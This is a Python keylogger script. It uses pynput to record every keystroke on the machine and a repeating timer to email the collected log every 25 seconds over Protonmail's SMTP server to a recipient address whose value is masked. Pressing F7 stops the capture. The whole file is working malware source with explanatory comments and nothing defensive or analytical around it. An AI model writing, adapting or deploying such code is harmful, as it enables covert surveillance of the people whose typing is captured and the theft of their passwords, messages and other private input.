#  module for capturing the keyboard events 
from pynput import keyboard
#  allows creation of a function which execute at an interval
from threading import Timer
# a module which allows you to send emails using the Simple Mail Transfer Protocol
import smtplib
# for formatting mail text
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


# setting email parameters to be deployed
email_adress = "###############"
email_password = "##############"
recipient_email_adress = "a#########"
# this represents the time in seconds when to receive the email report
log_interval = 25

# creating a variable to store the keystrokes that have been collected
keys_log = ""
# using the F7 key on the keyboard to stop collecting key logs
exit_keylogging = keyboard.Key.f7

# creation of send_email function to collect the keystrokes and send them via email
def send_email(keys_log):
    # send message with the keys logged by a user
    msg = MIMEMultipart()
    msg['From'] = email_adress
    msg['To'] = recipient_email_adress
    msg['Subject'] = "Keylogger Report"
    
    # attaching the log as plain text in the email body and send it back 
    msg.attach(MIMEText(keys_log, 'plain'))
    
    try:
        # connects to the SMTP
        server = smtplib.SMTP('smtp.protonmail.ch', 587)
        # secure connection via TLS
        server.starttls()
        # authenticate before logging in
        server.login(email_adress, email_password)
        # send email to recipient address 
        server.sendmail(email_adress, recipient_email_adress, msg.as_string())
        # close the connection
        server.quit()
    except Exception as e:
        print(f"Failed to send the message, error occurred: {e}")
        
# This function is invoked every time a key is pressed
def capturing_pressed_keys(key):
    global keys_log
    
    try:
        # appending the key pressed to the log
        keys_log += key.char
    except AttributeError:
        keys_log += f' {str(key)} '
        
    # checking if the key pressed is the termination key
    if key == exit_keylogging:
        print("Keylogger has been stopped.")
        # returning False stops the listener
        return False
    
# a function to handle sending logged keystrokes via email at regular intervals
def send_logged_keystrokes():
    global keys_log
    # send the logged keystrokes via email at regular intervals
    if keys_log:
        send_email(keys_log)
        # clear the log after sending 
        keys_log = ""

    # scheduling the next send logged keystrokes
    timer = Timer(log_interval, send_logged_keystrokes)
    timer.start()

# setting up the listener 
with keyboard.Listener(on_press=capturing_pressed_keys) as listener:
    send_logged_keystrokes()
    # start the listener
    listener.join()
    
    
    # end of code
    